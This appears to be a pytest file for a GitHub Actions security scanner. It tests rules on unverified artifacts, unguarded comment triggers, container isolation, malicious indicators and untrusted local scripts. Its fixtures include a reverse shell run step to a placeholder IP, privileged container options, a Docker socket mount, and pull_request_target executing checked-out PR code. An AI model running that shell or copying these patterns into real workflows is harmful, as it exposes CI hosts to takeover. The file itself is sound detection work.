"""Per-rule tests for GitHub Actions advanced-trigger and threat
rules:
GHA-009 (workflow_run downloads upstream artifact unverified),
GHA-013 (issue_comment trigger without author guard),
GHA-026 (container job disables isolation via options:),
GHA-027 (workflow contains malicious-activity indicators),
GHA-032 (run: invokes local script on untrusted-trigger workflow).

GHA-009 / GHA-032 close the privileged-context PPE surface that
``pull_request_target`` and ``workflow_run`` open. GHA-013 covers the
``issue_comment`` trigger that GHA-002 doesn't (different event
shape). GHA-026 catches container-isolation breakage that the
``container.options:`` passthrough enables. GHA-027 is the threat-
indicator catch-all (reverse shells, miners, exfil, audit erasure).
"""
from __future__ import annotations

from .conftest import run_check

# ── GHA-009 workflow_run artifact verification ──────────────────────


class TestGHA009WorkflowRunArtifact:
    def test_fails_when_workflow_run_downloads_artifact_without_verify(self):
        wf = """
        name: privileged-consume
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          consume:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/download-artifact@a3f9f8eedb3f6e3e3a09f4f4aaf0d7d1f5c4f4e3
                with: { name: build-output }
              - run: ./run-binary
        """
        f = run_check(wf, "GHA-009")
        assert not f.passed

    def test_passes_with_cosign_verify_attestation(self):
        wf = """
        name: privileged-consume
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          consume:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/download-artifact@a3f9f8eedb3f6e3e3a09f4f4aaf0d7d1f5c4f4e3
                with: { name: build-output }
              - run: cosign verify-attestation --type slsaprovenance ./artifact
              - run: ./run-binary
        """
        f = run_check(wf, "GHA-009")
        assert f.passed

    def test_passes_when_workflow_run_does_not_download_artifact(self):
        wf = """
        name: ping-only
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          ping:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo done
        """
        f = run_check(wf, "GHA-009")
        assert f.passed

    def test_passes_when_trigger_is_not_workflow_run(self):
        wf = """
        name: pr-ci
        on: pull_request
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps: [ { run: pytest } ]
        """
        f = run_check(wf, "GHA-009")
        assert f.passed


# ── GHA-013 issue_comment author guard ──────────────────────────────


class TestGHA013IssueCommentGuard:
    def test_fails_when_issue_comment_has_no_author_guard(self):
        wf = """
        name: comment-trigger
        on: issue_comment
        jobs:
          react:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo "/${{ github.event.comment.body }}"
        """
        f = run_check(wf, "GHA-013")
        assert not f.passed

    def test_passes_with_author_association_guard(self):
        wf = """
        name: comment-trigger
        on: issue_comment
        jobs:
          react:
            if: contains('OWNER MEMBER COLLABORATOR', github.event.comment.author_association)
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo handled
        """
        f = run_check(wf, "GHA-013")
        assert f.passed

    def test_passes_with_actor_allowlist_guard(self):
        wf = """
        name: comment-trigger
        on: discussion_comment
        jobs:
          react:
            if: github.actor == 'release-bot'
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo handled
        """
        f = run_check(wf, "GHA-013")
        assert f.passed

    def test_passes_when_no_comment_trigger(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-013")
        assert f.passed


# ── GHA-026 container job isolation ─────────────────────────────────


class TestGHA026ContainerEgress:
    def test_fails_on_privileged_container_options(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            container:
              image: node:20-alpine@sha256:0000000000000000000000000000000000000000000000000000000000000001
              options: --privileged --network host
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-026")
        assert not f.passed

    def test_fails_on_docker_socket_bind_mount_in_service(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            services:
              dind:
                image: docker:24-dind@sha256:0000000000000000000000000000000000000000000000000000000000000002
                options: -v /var/run/docker.sock:/var/run/docker.sock
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-026")
        assert not f.passed

    def test_passes_with_safe_options(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            container:
              image: node:20-alpine@sha256:0000000000000000000000000000000000000000000000000000000000000001
              options: --cpus=2 --memory=2g
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-026")
        assert f.passed

    def test_passes_when_no_container_block(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-026")
        assert f.passed


# ── GHA-027 malicious-activity indicators ───────────────────────────


class TestGHA027MaliciousActivity:
    def test_fails_on_reverse_shell_run_step(self):
        wf = """
        name: ci
        on: push
        jobs:
          ship:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
        """
        f = run_check(wf, "GHA-027")
        assert not f.passed

    def test_passes_on_clean_workflow(self):
        wf = """
        name: ci
        on: push
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps: [ { run: pytest } ]
        """
        f = run_check(wf, "GHA-027")
        assert f.passed


# ── GHA-032 run: invoking local script under untrusted trigger ──────


class TestGHA032IndirectPPE:
    def test_fails_when_pull_request_target_runs_local_script(self):
        wf = """
        name: pr-build
        on: pull_request_target
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
                with: { ref: '${{ github.event.pull_request.head.sha }}' }
              - run: ./scripts/build.sh
        """
        f = run_check(wf, "GHA-032")
        assert not f.passed

    def test_fails_when_workflow_run_runs_bash_local_script(self):
        wf = """
        name: build-on-completed
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
              - run: bash scripts/build.sh
        """
        f = run_check(wf, "GHA-032")
        assert not f.passed

    def test_passes_when_inline_shell_only(self):
        wf = """
        name: pr-lint
        on: pull_request_target
        jobs:
          lint:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo no checkout, no script invocation
        """
        f = run_check(wf, "GHA-032")
        assert f.passed

    def test_passes_when_trigger_is_trusted(self):
        wf = """
        name: release
        on:
          push:
            branches: [main]
        jobs:
          ship:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
              - run: ./scripts/release.sh
        """
        f = run_check(wf, "GHA-032")
        assert f.passed
